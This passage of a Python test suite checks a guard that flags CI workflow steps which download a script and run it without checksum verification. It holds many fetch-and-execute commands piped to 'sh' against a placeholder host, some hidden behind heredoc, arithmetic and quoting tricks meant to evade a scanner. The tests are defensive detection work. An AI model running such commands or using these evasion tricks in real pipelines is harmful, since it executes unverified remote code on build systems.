            wg.Step("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX, None, when),
            wg.Step("flip", 'echo "NEED=no" >> "$GITHUB_ENV"\n'),
            wg.Step("run", "chmod +x /tmp/p\n/tmp/p\n", None, when))

    # 11. a directory on the runner's PATH past `PATH_DIRS`, or one a step
    # puts there itself (#2308 closed the fixed ones:
    # `TestADownloadWrittenIntoADirectoryOnPath`; review N-4 named the rest).
    def test_a_directory_a_step_puts_on_path(self):
        fetch = ("get", "curl -sfL https://example.test/p -o bin/payload\n")
        self.accepted(fetch, ("path", 'echo "$PWD/bin" >> "$GITHUB_PATH"\n'),
                      ("run", "payload --version\n"))
        self.accepted(fetch, ("run", 'export PATH="$PWD/bin:$PATH"\npayload --version\n'))
        self.flagged(("get", "curl -sfL https://example.test/p -o /usr/local/bin/payload\n"),
                     ("run", "payload --version\n"))
        # ... and the runner image's own directories past `PATH_DIRS` (review
        # N-4), which bash 3.2 and 5.2 find a bare name in when on PATH.
        for dest in ('"$HOME/.cargo/bin/payload"', "/snap/bin/payload"):
            self.accepted(("get", "curl -sfL https://example.test/p -o %s\n" % dest),
                          ("run", "payload --version\n"))


class TestRunSteps(unittest.TestCase):
    """The reader the repo-wide rule and the CLI share."""

    DOC = {"jobs": {"build": {"steps": [
        {"name": "checkout", "uses": "actions/checkout@" + "0" * 40},
        {"name": "install", "run": "curl -fsSL https://example.test/i.sh | sh\n"},
        {"run": "make test\n"},
    ]}}}

    def test_every_run_step_is_yielded_with_its_name(self):
        self.assertEqual(
            [wg.Step("install", "curl -fsSL https://example.test/i.sh | sh\n", None),
             wg.Step("<unnamed step>", "make test\n", None)],
            list(wg.run_steps(self.DOC)))

    def test_a_document_with_no_jobs_yields_nothing(self):
        self.assertEqual([], list(wg.run_steps({})))


class TestCli(unittest.TestCase):
    """`python3 scripts/workflow_guard.py .github/workflows/*.yml` -- the same
    rule the suite runs, for a human holding a shell."""

    WORKFLOW = ("name: t\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - name: install\n"
                "        run: curl -fsSL https://example.test/i.sh | sh\n")

    def test_it_reports_and_fails_on_an_unverified_fetch(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "bad.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(self.WORKFLOW)
            lines: list[str] = []
            self.assertEqual(1, wg.main([path], out=lines.append))
            self.assertTrue(any("install" in ln for ln in lines), lines)

    def test_a_clean_workflow_exits_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "ok.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(self.WORKFLOW.replace(
                    "curl -fsSL https://example.test/i.sh | sh", "make test"))
            self.assertEqual(0, wg.main([path], out=lambda _line: None))

    def test_a_step_the_reader_refuses_is_named_and_the_rest_still_read(self):
        # A `shell_lex.Unreadable` escaped `main` as a traceback: it named no
        # workflow, job or step, and printed no other step's defect (#2252).
        steps = (("nested", "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF"),
                 ("same line", "echo \"$(cat <<EOF)\"\nit's\nEOF"),
                 ("read again", "echo `echo $(cat <<EOF)`"),
                 ("delimiter", "cat <<$(a b)\nit's\n$(a b)\n"
                               "curl -fsSL https://example.test/i.sh | sh"),
                 ("install", "curl -fsSL https://example.test/i.sh | sh"))
        workflow = self.WORKFLOW[:self.WORKFLOW.index("      - name:")] + "".join(
            "      - name: %s\n        run: |\n%s" % (name, "".join(
                "          %s\n" % line for line in script.split("\n")))
            for name, script in steps)
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "bad.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(workflow)
            lines: list[str] = []
            self.assertEqual(1, wg.main([path], out=lines.append))
        self.assertEqual(len(steps) + 1, len(lines), lines)
        for (name, _script), line in zip(steps, lines):
            self.assertTrue(line.startswith("bad.yml / b / %s -- " % name), line)
        for line in lines[:4]:
            self.assertIn(" -- cannot read this step: ", line)
        self.assertIn("straight to `sh`", lines[4])
        # The count names what it counts, a refused step as well as a fetch.
        self.assertEqual("5 defect(s): unverified fetch-and-exec, or code the guard cannot "
                         "read; see scripts/workflow_guard.py", lines[5])


if __name__ == "__main__":  # pragma: no cover
    unittest.main()


class TestRedirectAndMarkerProvenance(unittest.TestCase):
    URL = 'https://example.test/i.sh'

    def test_redirect_variants_bind_use_and_checksum(self):
        for redirect in ('>f', '>>f', '>|f', '&>f', '&>>f',
                         ' 3>f 1>&3', ' 3>f 1>&3 3>g', ' 2>f 1>&2', ' 2>&1>f'):
            with self.subTest(redirect=redirect):
                fetch = 'curl ' + self.URL + redirect
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + ' && sh f'))
                checked = fetch + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                self.assertIsNone(wg.fetch_exec_defect(checked))
                self.assertIsNotNone(wg.fetch_exec_defect(checked.replace('  f"', '  other"')))

    def test_dynamic_destination_is_unknown_without_claiming_execution(self):
        for output in ('> $(mktemp)', '-o "$(mktemp)"', '-o$(mktemp)',
                       '--output=$(mktemp)', '--output-dir=$(mktemp) -o f',
                       ' 3>$(mktemp) 1>&3'):
            with self.subTest(output=output):
                defect = wg.fetch_exec_defect('curl ' + self.URL + ' ' + output)
                self.assertIsNotNone(defect)
                self.assertIn('unknown destination', defect)
                self.assertNotIn('running', defect)
                self.assertNotIn('@@', defect)
        self.assertIsNone(wg.fetch_exec_defect('curl ' + self.URL))
        self.assertIsNotNone(wg.fetch_exec_defect(
            'f=$(mktemp); curl ' + self.URL + ' > "$f"; sh "$f"'))

    def test_literals_in_nested_scripts_are_not_filtered(self):
        for wrapper in ('eval', 'sh -c'):
            for marker in ('@@subst0@@', '@@heredoc0@@', '@@casearm@@',
                           '@@group-open@@', '@@group-close@@'):
                script = wrapper + ' "echo ' + marker + '; curl ' + self.URL + ' | sh"'
                self.assertIsNotNone(wg.fetch_exec_defect(script), script)

    def test_literal_substitution_is_not_credited_twice(self):
        script = 'eval "@@subst0@@" "$(curl ' + self.URL + ')"'
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_literal_case_marker_does_not_promote_command(self):
        self.assertEqual([], wg.fetches('@@casearm@@curl ' + self.URL + ' | sh'))
        self.assertIsNotNone(wg.fetch_exec_defect(
            'case x in a|b) echo @@casearm@@; curl ' + self.URL + ' | sh;; esac'))

    def test_literal_destination_stays_literal_beside_real_substitution(self):
        for marker in ('@@subst0@@', '@@heredoc0@@', '@@casearm@@',
                       '@@group-open@@', '@@group-close@@'):
            # A second URL/operand after curl is an unread multiple-transfer
            # case; the header operand tests substitution handling separately.
            fetch = 'curl ' + self.URL + ' -H "$(echo unused)" > "' + marker + '"'
            self.assertIsNone(wg.fetch_exec_defect(fetch))
            defect = wg.fetch_exec_defect(fetch + '; sh "' + marker + '"')
            self.assertIsNotNone(defect)
            self.assertIn(marker, defect)
            self.assertNotIn('unknown destination', defect)


class TestDestinationProvenanceControls(unittest.TestCase):
    def test_only_the_final_stdout_sink_is_dynamic(self):
        script = 'curl https://example.test/i.sh >$(mktemp) >f; sh f'
        defect = wg.fetch_exec_defect(script)
        self.assertIsNotNone(defect)
        self.assertNotIn('unknown destination', defect)
        self.assertEqual('f', wg.fetches(script)[0].dest)
        self.assertIsNone(wg.fetch_exec_defect(
            'curl https://example.test/i.sh >$(mktemp) 1>&2'))

    def test_a_literal_eval_operand_beside_real_substitution_is_still_read(self):
        script = ('eval "echo @@subst0@@; curl https://example.test/literal | sh" '
                  '"$(curl https://example.test/substitution)"')
        self.assertEqual(2, len(wg.fetches(script)))
        defects = wg.fetch_exec_defects(script)
        self.assertEqual(2, len(defects))
        self.assertTrue(any('/literal' in d for d in defects))
        self.assertTrue(any('/substitution' in d for d in defects))


class TestExplicitDestinationPrecedence(unittest.TestCase):
    def test_named_output_is_not_replaced_by_stdout_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            with self.subTest(tool=tool):
                fetch = tool + ' https://example.test/i.sh ' + output + ' f >$(mktemp)'
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNone(wg.fetch_exec_defect(fetch))
                defect = wg.fetch_exec_defect(fetch + '; sh f')
                self.assertIsNotNone(defect)
                self.assertNotIn('unknown destination', defect)

    def test_dynamic_named_output_is_not_hidden_by_static_stdout_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            with self.subTest(tool=tool):
                fetch = tool + ' https://example.test/i.sh ' + output + ' $(mktemp) >f'
                self.assertIn('unknown destination', wg.fetch_exec_defect(fetch))

    def test_explicit_stdout_still_follows_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            for stdout in ('-', '/dev/stdout'):
                with self.subTest(tool=tool, stdout=stdout):
                    fetch = tool + ' https://example.test/i.sh ' + output + ' ' + stdout + '>f'
                    self.assertEqual('f', wg.fetches(fetch)[0].dest)
                    self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh f'))
                    self.assertIn('unknown destination',
                                  wg.fetch_exec_defect(fetch.replace('>f', '>$(mktemp)')))


class TestReviewedRedirectBoundaries(unittest.TestCase):
    def test_group_adjacent_redirects_bind_use_and_checksum(self):
        for fetch in ('(1>f curl https://example.test/a)',
                      '(3>f 1>&3 curl https://example.test/a)'):
            with self.subTest(fetch=fetch):
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh f'))
                checked = fetch + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                self.assertIsNone(wg.fetch_exec_defect(checked))
                self.assertIsNotNone(wg.fetch_exec_defect(checked.replace('  f"', '  other"')))

    def test_output_directory_does_not_change_explicit_stdout(self):
        for directory in ('out', '$(mktemp)'):
            for stdout in ('-', '/dev/stdout', '/dev/fd/1'):
                with self.subTest(directory=directory, stdout=stdout):
                    fetch = ('curl https://example.test/a --output-dir '
                             + directory + ' -o ' + stdout)
                    self.assertIsNone(wg.fetches(fetch)[0].dest)
                    self.assertIsNone(wg.fetch_exec_defect(fetch))
                    redirected = fetch + ' >f'
                    self.assertEqual('f', wg.fetches(redirected)[0].dest)
                    self.assertIsNotNone(wg.fetch_exec_defect(redirected + '; sh f'))
                    checked = redirected + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                    self.assertIsNone(wg.fetch_exec_defect(checked))
                    self.assertIn('unknown destination',
                                  wg.fetch_exec_defect(fetch + ' >$(mktemp)'))

    def test_explicit_discard_does_not_follow_stdout_redirects(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            for redirect in (' >$(mktemp)', ' 3>$(mktemp) 1>&3', ' >f'):
                with self.subTest(tool=tool, redirect=redirect):
                    fetch = tool + ' https://example.test/a ' + output + ' /dev/null' + redirect
                    self.assertIsNone(wg.fetches(fetch)[0].dest)
                    self.assertIsNone(wg.fetch_exec_defect(fetch))
                    self.assertIsNone(wg.fetch_exec_defect(fetch + '; sh f'))
                    dynamic = fetch.replace(output + ' /dev/null', output + ' $(mktemp)')
                    self.assertIn('unknown destination', wg.fetch_exec_defect(dynamic))


class TestInferredFilenameOrigin(unittest.TestCase):
    FETCHERS = ('curl -O --output-dir', 'wget -P')

    def test_inferred_dash_filename_binds_directory_use_and_checksum(self):
        for fetcher in self.FETCHERS:
            for redirect in ('', ' >g', ' >$(mktemp)'):
                with self.subTest(fetcher=fetcher, redirect=redirect):
                    fetch = fetcher + ' out https://example.test/-' + redirect
                    self.assertEqual('out/-', wg.fetches(fetch)[0].dest)
                    defect = wg.fetch_exec_defect(fetch + '; sh out/-')
                    self.assertIsNotNone(defect)
                    self.assertNotIn('unknown destination', defect)
                    checked = fetch + '\necho "' + HEX + '  out/-" | sha256sum -c -\nsh out/-'
                    self.assertIsNone(wg.fetch_exec_defect(checked))
                    self.assertIsNotNone(wg.fetch_exec_defect(
                        checked.replace('  out/-"', '  other"')))

    def test_inferred_dash_filename_keeps_dynamic_directory_provenance(self):
        for fetcher in self.FETCHERS:
            for redirect in ('', ' >g'):
                with self.subTest(fetcher=fetcher, redirect=redirect):
                    fetch = fetcher + ' "$(mktemp)" https://example.test/-' + redirect
                    self.assertTrue(shell_reader.has_substitution(wg.fetches(fetch)[0].dest))
                    self.assertIn('unknown destination', wg.fetch_exec_defect(fetch))

    def test_inferred_dash_without_directory_is_still_a_filename(self):
        for fetcher in ('curl -O', 'wget'):
            with self.subTest(fetcher=fetcher):
                fetch = fetcher + ' https://example.test/- >g'
                self.assertEqual('-', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh ./-'))


class TestIssue1852GuardSpellings(unittest.TestCase):
    FETCH = 'curl -fsSL https://example.test/p -o /tmp/d/p\n'
    USE = 'chmod +x /tmp/d/p\n'

    def test_long_check_flag_on_sha384_and_sha512_binds_the_download(self):
        for tool, digest in (('sha384sum', 'a' * 96),
                             ('sha512sum', 'b' * 128)):
            with self.subTest(tool=tool):
                check = 'echo "%s  /tmp/d/p" | %s --check -\n' % (digest, tool)
                self.assertIsNone(wg.fetch_exec_defect(self.FETCH + check + self.USE))
                other = 'echo "%s  /tmp/d/other" | %s --check -\n' % (digest, tool)
                self.assertIsNotNone(wg.fetch_exec_defect(
                    self.FETCH + other + self.USE))

    def test_long_recursive_chmod_names_only_the_walked_directory(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + 'chmod --recursive +x /tmp/d\n'))
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + 'chmod --recursive +x /tmp/other\n'))

    def test_find_execdir_names_only_the_walked_directory(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + r'find /tmp/d -name p -execdir chmod +x {} \;' + '\n'))
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + r'find /tmp/other -name p -execdir chmod +x {} \;' + '\n'))

    def test_download_executed_inside_arithmetic_remains_visible(self):
        script = 'echo $((1 + $(curl -fsSL https://example.test/install | sh)))\n'
        defect = wg.fetch_exec_defect(script)
        self.assertIsNotNone(defect)
        self.assertIn('https://example.test/install', defect)

    def test_deep_arithmetic_does_not_hide_nested_download_from_guard(self):
        arithmetic = ('$((1+' * 1000 +
                      '$(curl -fsSL https://example.test/deep | sh)' + '))' * 1000)
        defect = wg.fetch_exec_defect('echo ' + arithmetic + '; echo done')
        self.assertIsNotNone(defect)
        self.assertIn('https://example.test/deep', defect)


class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
    """#1793 (COD-3418139920, COD-3636110933): steps the reader's lexing hid.

    `shell_reader.statements()` read comments, continuations and heredocs in
    three line-oriented passes that ran before any quote tracking, and its
    `$(...)` matcher took `\\"` inside a nested string for a closing quote.
    Each flagged step below pipes a download into `sh` after one such
    construct, and real bash runs that payload every time. Until the three
    passes became one quote-aware pass (`scripts/shell_lex.py`) the guard
    reported most of them clean -- through `job_defects`, the path the fleet
    test takes; the rest pin what that pass must read right as well.
    """

    PAYLOAD = "curl -fsSL https://example.test/i.sh | sh"

    def flagged(self, script):
        found = wg.job_defects([("step", script)])
        self.assertEqual(1, len(found), found)
        self.assertIn("https://example.test/i.sh", found[0][1])

    def refused(self, script, *named):
        """The step the reader will not guess at is its one defect, reported
        under the step's name with the reason."""
        found = wg.job_defects([("step", script)])
        self.assertEqual(1, len(found), found)
        self.assertEqual("step", found[0][0])
        self.assertRegex(found[0][1],
                         r"^cannot read this step: .+; nothing in it is accepted$")
        for text in named:
            self.assertIn(text, found[0][1])

    def test_a_hash_line_inside_a_multi_line_string_is_text(self):
        # V1 and V2; then V2 after a nested `"$(echo "it's")"`, whose
        # apostrophe is inside two strings, not the opening of a third.
        for opening in ('echo "multi\n# not a comment"',
                        "echo 'multi\n# not a comment'",
                        'echo "$(echo "it\'s")"\necho \'multi\n# not a comment\''):
            with self.subTest(opening=opening):
                self.flagged("%s ; %s\n" % (opening, self.PAYLOAD))

    def test_a_heredoc_operator_bash_does_not_read_swallows_nothing(self):
        # V3-V6: `<<WORD` inside "...", inside '...', inside a comment and as
        # the tail of a `<<<` here-string. Then inside backquotes, whose text
        # bash reads later as its own script, and as an arithmetic shift, in
        # `$((...))` and in the older `$[...]`.
        for opening, word in (('echo "<<true"', "true"),
                              ("echo '<<EOF'", "EOF"),
                              ("echo hi # see <<true", "true"),
                              ("cat <<<true", "true"),
                              ("echo `cat <<EOF`", "EOF"),
                              ("echo $((1<<X))", "X"),
                              ("echo $[1<<2]", "2]")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))

    def test_a_hash_that_does_not_start_a_word_is_text(self):
        # A `#` after a carriage return or a form feed -- word characters to
        # bash, whitespace to Python -- or inside `${...}` starts no comment;
        # a second comment rule in the statement splitter read all three as
        # one and hid the rest of the line.
        for opening in ("echo a\r# c", "echo a\x0c# c", "echo ${x:-a #b}"):
            with self.subTest(opening=opening):
                self.flagged("%s ; %s\n" % (opening, self.PAYLOAD))

    def test_a_backslash_ending_a_comment_or_a_quoted_body_continues_nothing(self):
        # V7: a comment ends at the newline, backslash or not. V8: a quoted
        # body is read verbatim, so its backslash cannot eat the terminator.
        self.flagged("echo hi # note \\\n%s\n" % self.PAYLOAD)
        self.flagged("cat <<'EOF'\ndata \\\nEOF\n%s\nEOF\n" % self.PAYLOAD)

    def test_a_body_ends_on_the_line_bash_ends_it_on(self):
        # The delimiter is the whole word, not its `EOF` prefix; `  EOF` is a
        # body line, not a terminator; an unquoted body is compared folded, so
        # `E\` + `OF` ends it; and the body starts after the newline that ends
        # the command, which a string running over two lines moves down. A
        # `\`-newline and a blank before the word are both gone to bash; read
        # as an empty word, they let the first empty line end the body -- here
        # the empty end after the script's last newline, past the payload.
        for script in ("cat <<EOF-X\nbody\nEOF-X\n%s\nEOF\n",
                       "cat <<EOF\n  EOF\nit's\nEOF\n%s\n",
                       "cat <<EOF\nE\\\nOF\n%s\nEOF\n",
                       'cat <<EOF; echo "multi\nline"\nbody\nEOF\n%s\n',
                       "cat << \\\n EOF\nit's\nEOF\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)

    def test_a_continuation_inside_the_operator_is_gone(self):
        # #2291: to bash, `<\` + newline + `<EOF` is `<<EOF`, `<<\` + newline
        # + `-EOF` is `<<-EOF`, and `<\` + newline + `<< x` is `<<< x`; bash
        # 3.2 and 5.2 run the payload below each, which the guard read clean.
        # A joined word bash parses is refused by name, as it is unsplit;
        # `\` before a word and `<\` + newline + a file read as they did.
        for script in ("cat <\\\n<EOF\nit's\nEOF\n%s\n", "cat 3<\\\n<EOF\nit's\nEOF\n%s\n",
                       "cat <<\\\n-EOF\n\tit's\n\tEOF\n%s\n",
                       "cat <\\\n<\\\n-EOF\n\tit's\n\tEOF\n%s\n", "cat <\\\n<< x\n%s\nx\n",
                       "cat <<\\EOF\nit's $x\nEOF\n%s\n", "echo hi >f\ncat <\\\nf\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)
        self.refused("cat <\\\n<$(x)\nit's\n$(x)\n%s\n" % self.PAYLOAD, "`$(x)`")

    def test_an_array_subscript_is_arithmetic(self):
        # Where bash 5.2 reads an assignment -- at the head of a command, after
        # `x=1`, `then`, `time -p`, a pipe, `function f {` or a leading
        # redirection, and inside `name=(...)`, `declare`'s too -- it reads
        # `a[...]` as an arithmetic subscript, spaces, lines and all, so its
        # `<<` is a shift (3.2 rejects the two-line `a=(` and reads the
        # redirection line as a heredoc). The regex this replaced took
        # `a[i << X ]=y` for a heredoc and let the decoy line below end it;
        # the subscript rule before this one ended a subscript at its line
        # and opened none inside `(...)`, with the same result.
        for opening, word in (("a[1<<2]=x", "2]=x"), ("a[i << X ]=y", "X"),
                              ("x=1 a[1<<2]=y", "2]=y"),
                              ("if true; then a[1<<2]=y; fi", "2]=y"),
                              ("a[1\n<<X]=y", "X]=y"), ("a=([1<<X]=y)", "X]=y"),
                              ("declare a=([1<<X]=y)", "X]=y"),
                              ("a=(\n[1<<X]=y\n)", "X]=y"),
                              (">/dev/null a[1<<X]=y", "X]=y"),
                              ("time -p a[1<<X]=y", "X]=y"),
                              ("function f { a[1<<X]=y; }", "X]=y"),
                              ("x=$(echo) a[1<<X]=y", "X]=y"), ("true | a[1<<X]=y", "X]=y")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))

    def test_an_argument_is_no_subscript(self):
        # Among a command's arguments -- `echo`'s, `declare`'s, `printf`'s,
        # and a `time` after a pipe, an `if` after an assignment or a
        # redirection, which name programs there -- `<` ends the word and
        # `<<X]` is a heredoc, whose body holds the open quote. Read as a
        # subscript, the quote hid the payload bash runs after `X]`.
        for opening, word in (("echo a[1<<X]", "X]"), ("declare a[1<<X]=y", "X]=y"),
                              ("printf '%s' a[1<<X]", "X]"), ("true | time a[1<<X]", "X]"),
                              ("a=1 if a[1<<X]", "X]"), (">/dev/null if a[1<<X]", "X]"),
                              ("echo 2>&1 a[1<<X]", "X]"), ("echo &>/dev/null a[1<<X]", "X]"),
                              ("declare a=(x) b[1<<X]", "X]"), ("coproc c d a[1<<X]", "X]"),
                              ("\\a[1<<X]", "X]")):
            with self.subTest(opening=opening):
                self.flagged("%s\nit's\n%s\n%s\n" % (opening, word, self.PAYLOAD))
        # `a[1]x]=y` is no assignment, so it is the command: a pattern bash
        # globs, reported too (#2294), before the payload the heredoc hid.
        found = wg.job_defects([("step", "a[1]x]=y b[1<<X]\nit's\nX]\n%s\n" % self.PAYLOAD)])
        self.assertEqual(2, len(found), found)
        self.assertIn("`a[1]x]=y` is a pattern", found[0][1])
        self.assertIn("https://example.test/i.sh", found[1][1])

    def test_a_command_double_paren_is_read_as_bash_decides_it(self):
        # Bash matches a command's `((` to the close of its first group --
        # through quotes, escapes, backquotes and `$(...)`, not comments --
        # and reads one character more: `)` makes it arithmetic, anything
        # else two subshells, whose heredocs are real. Each opening below is
        # two subshells to bash 5.2, which reads the open quote as a body and
        # runs the payload (3.2 too, but for `function fn ((`, a syntax error
        # there); the reader took each for arithmetic, where `<<` is a shift,
        # and the quote hid the payload (M5).
        for opening in ("((cat <<EOF) )", "(((: <<EOF) ) )", "((: <<EOF '))' ) )",
                        '((: <<EOF "))" ) )', "((: <<EOF \\)) )",
                        "((: `echo )` <<EOF) )", "((: $'\\')' <<EOF) )",
                        "((: $[ ) ]<<EOF ) )", "((: $(echo ')') <<EOF) )",
                        "fn() ((cat <<EOF) )", "function fn ((cat <<EOF) )"):
            with self.subTest(opening=opening):
                self.flagged("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))

    def test_arithmetic_ends_at_the_parenthesis_bash_ends_it_at(self):
        # `))` right after the first group -- past a `#`, a character to
        # arithmetic, and a quoted `(` -- is an arithmetic command: `<<` is a
        # shift, the lines below are code, and `y` ends no heredoc. And
        # arithmetic counts the parentheses in a `${...}` as its own, so a
        # `))` there ends `((...))` and `$((...))` alike and the heredoc after
        # it is real: the reader read on to a later `))`, and the body's open
        # quote hid the payload. Bash 5.2 runs each payload (3.2 refuses the
        # `{ ((x${y:-))}` line as a syntax error, and runs nothing).
        for script in ("((x=1<<y))\n%s\ny\n", "((i++ << y))\n%s\ny\n",
                       "(( x > 3 << y ))\n%s\ny\n",
                       "if (( a < b << y )); then :; fi\n%s\ny\n",
                       "((\n x<<y \n))\n%s\ny\n", "((: # <<y))\n%s\ny\n",
                       '((: $(echo "(") <<y))\n%s\ny\n',
                       "{ ((x${y:-))} <<EOF\nit's\nEOF\n%s\n",
                       "echo $((x${y:-))} <<EOF\nit's\nEOF\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)

    def test_nesting_too_deep_to_decide_fails_closed(self):
        # Each level of `((((` is read once more when bash's rule makes it a
        # subshell. Past eight times the script's length of that, the reader
        # raises instead of guessing, and the guard reports the step by name.
        script = "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF\n%s\n"
        self.refused(script % self.PAYLOAD, "`((`")

    def test_a_heredoc_its_substitution_closes_over_fails_closed(self):
        # A `<<` in a `$(...)`, `<(...)` or `>(...)` that closes before the
        # newline its body would follow. Bash 3.2 stops at the open quote below
        # with a syntax error. 5.2 warns "command substitution: 1 unterminated
        # here-document", reads the body from the lines below, and reads the
        # payload after its terminator as code: it runs, unless the command
        # holding the substitution fails first under `set -e`. The reader left
        # the operator as text, so the quote hid that payload -- which main's
        # line-by-line heredoc pass had lifted into view. It raises instead of
        # modelling 5.2's recovery, and the guard reports the step by name.
        for opening in ('echo "$(cat <<EOF)"', "echo $(cat <<EOF)", "x=$(cat <<EOF)",
                        "cat <(cat <<EOF)", "echo >(cat <<EOF)", "echo ${x:-$(cat <<EOF)}",
                        "echo $[ $(cat <<EOF) ]", "(( $(cat <<EOF) ))", "a[$(cat <<EOF)]=1",
                        "echo $( (cat <<EOF) )", 'x=$(cat <<EOF; echo "a\nb")'):
            with self.subTest(opening=opening):
                self.refused("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD), "closes before")
        # Backquotes are no such frame. Bash reads their text later, as a
        # script of its own in which the heredoc has no body, and 5.2 runs
        # nothing here: the open quote below is a syntax error. Read as before.
        self.assertEqual([], wg.job_defects(
            [("step", "echo `cat <<EOF`\nit's\nEOF\n%s\n" % self.PAYLOAD)]))

    def test_a_substitution_inside_arithmetic_is_code(self):
        # In `$((...))`, as in `((...))` and `$[...]`, bash reads a `$(...)`
        # as a command substitution: `#` starts a comment there, `<<` a
        # heredoc, whose body is read inside it or fails closed as above. The
        # reader read `$((...))` as one pair of parentheses, so a quote in
        # that comment, or in that body, hid a payload bash 5.2 runs (and
        # 3.2 runs the first).
        for script in ("echo $(( $(: # ) ) '\n) ))\n%s\n'\n",
                       "echo $(( $(cat <<EOF\nit's\nEOF\n) ))\n%s\n",
                       "echo $(( $(: <<E\n)it's\nE\n) ))\n%s\n"):
            with self.subTest(script=script):
                self.flagged(script % self.PAYLOAD)
        for opening in ("echo $(( $(cat <<EOF) ))", "echo $(( $(( $(cat <<EOF) )) ))"):
            with self.subTest(opening=opening):
                self.refused("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD), "closes before")
        # Outside such a substitution `<<` is still a shift, and the line
        # below that spells its right side ends nothing.
        for opening, word in (("echo $(( 1<<2 ))", "2"), ("echo $(( a << b ))", "b"),
                              ("echo $(( $(nproc) * 2 ))", "2"), ("echo $[1<<2]", "2]")):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))
        # Backquotes in arithmetic are text until bash runs them, as a
        # script of its own in which the heredoc has no body: 5.2 runs
        # nothing here, the open quote below being a syntax error.
        self.assertEqual([], wg.job_defects(
            [("step", "echo $(( `cat <<EOF` ))\nit's\nEOF\n%s\n" % self.PAYLOAD)]))

    def test_a_body_inside_its_open_substitution_is_read_there(self):
        # The fleet's form, where the body lines sit inside a `$(...)` still
        # open, reads as it did: a body with an open quote is read as a body,
        # and hides nothing that follows the substitution.
        for opening in ("X=\"$(cat <<'EOF'\nit's\nEOF\n)\"",
                        "echo ${x:-$(cat <<EOF\nit's\nEOF\n)}", "cat <(cat <<EOF\nit's\nEOF\n)"):
            with self.subTest(opening=opening):
                self.flagged("%s\n%s\n" % (opening, self.PAYLOAD))

    def test_a_delimiter_bash_parses_to_spell_is_refused(self):
        # Bash spells these delimiters by PARSING the word -- a substitution,
        # an escape `$'...'` decodes, an extglob pattern -- and ends the body
        # only at a line spelled the same. The reader does not parse words,
        # and neither reading short of that is safe: the regex this replaced
        # guessed that `<<EOF$(x)` was `<<EOF`, so the decoy line below the
        # payload ended the body, and reading the body as code let the quote
        # in `it's` hide the payload below the terminator, which bash 3.2 and
        # 5.2 both run (#2224). So the step is refused, and the reason names
        # the word. The same shape spelled with no parse -- quoted, or a
        # `$'...'` that decodes nothing -- is still read as a heredoc.
        for word, terminator, decoy, spelled in (
                ("$(a b)", "$(a b)", "$", "'$(a b)'"),
                ("$'\\x41'", "A", "x41", "$'A'"),
                ("${x y}", "${x y}", "${x", "'${x y}'"),
                ("@(a b)", "@(a b)", "@", "'@(a b)'"),
                ('"$(echo ")")"', "$(echo ))", "$(echo ", "'$(echo ))'"),
                ("EOF$(x)", "EOF$(x)", "EOF", "EOF'$(x)'")):
            opening = "shopt -s extglob\ncat <<" if word[0] == "@" else "cat <<"
            with self.subTest(word=word):
                self.refused(opening + "%s\nit's\n%s\n%s\n" % (word, terminator, self.PAYLOAD),
                             "`%s`" % word)
                self.refused(opening + "%s\n%s\n%s\n%s\n" % (word, terminator, self.PAYLOAD,
                                                             decoy), "`%s`" % word)
                self.flagged(opening + "%s\nit's\n%s\n%s\n" % (spelled, terminator,
                                                               self.PAYLOAD))
        self.flagged("cat <<EOF\nit's\nEOF\n%s\n" % self.PAYLOAD)

    def test_a_text_the_guard_reads_again_is_refused_by_its_step(self):
        # The guard reads the text of each substitution as a script of its
        # own: a backquote's text, a `$(...)` in an expanding heredoc body,
        # and a `$( ...)` holding a `((` nest that the whole step is long
        # enough to read under the cap and the substitution alone is not.
        # Each raised when `_defects` read it again, past the step's own
        # read, as a traceback naming no step.
        for script, cause in (("echo `echo $(cat <<EOF)`\n", "closes before"),
                              ('cat <<EOF\n$(echo "$(cat <<X)"\n)\nEOF\n', "closes before"),
                              ("echo $( %s: <<EOF%s\nit's\nEOF\n)\n# %s\n"
                               % ("(" * 50, ") " * 50, "x" * 4000), "`((`")):
            with self.subTest(script=script[:30]):
